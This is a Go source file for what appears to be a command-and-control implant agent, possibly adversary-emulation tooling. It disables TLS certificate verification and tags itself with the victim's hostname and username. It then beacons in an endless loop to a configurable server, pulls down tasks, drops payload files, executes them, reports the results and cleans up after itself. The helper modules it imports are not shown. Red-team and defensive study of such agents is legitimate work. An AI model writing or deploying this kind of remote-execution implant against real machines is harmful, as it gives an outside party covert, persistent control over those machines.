package main

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"os"
	"os/user"
	"time"
	"reflect"
	"./modules"
)

var beacon = 60

func stayInTouch(server string, paw string, group string, files string) {
	fmt.Println("[+] Beaconing")
	commands := modules.Beacon(server, paw, group, files)
	if commands != nil && len(commands.([]interface{})) > 0 {
		cmds := reflect.ValueOf(commands)
		for i := 0; i < cmds.Len(); i++ {
			cmd := cmds.Index(i).Elem().String()
			fmt.Println("[+] Running instruction")
			command := modules.Unpack([]byte(cmd))
			modules.Drop(server, files, command)
			modules.Results(server, paw, command)
			modules.ApplyCleanup(command)
		}
	} else {
		modules.Cleanup(files)
		time.Sleep(time.Duration(beacon) * time.Second)
	}
}

func main() {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	host, _ := os.Hostname()
	user, _ := user.Current()
	paw := fmt.Sprintf("%s$%s", host, user.Username)
	files := os.TempDir()
	server := "http://localhost:8888"
	group := "client"

	if len(os.Args) == 3 {
		server = os.Args[1]
		group = os.Args[2]	
	} 
	for {
		stayInTouch(server, paw, group, files)
	}
}
